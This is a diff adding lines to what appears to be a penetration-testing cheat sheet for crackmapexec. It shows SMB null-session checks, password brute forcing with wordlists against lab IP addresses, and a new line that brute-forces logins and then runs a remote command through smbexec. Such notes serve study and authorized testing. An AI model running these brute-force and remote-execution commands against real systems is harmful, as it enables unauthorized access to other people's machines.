@@ -15,7 +15,8 @@ crackmapexec smb 10.1.11.20 -u '' -p ''
 # bruteforce SMB login
 crackmapexec --verbose smb 10.11.1.220 -d thinc.local -u kevin -p  /usr/share/wordlists/wfuzz/others/common_pass.txt
 
-
+# bruteforce with lists
+crackmapexec smb 10.11.1.21  -u users.txt -p passwords.txt --exec-method smbexec -x whoami
 
 - --] WINRM
 
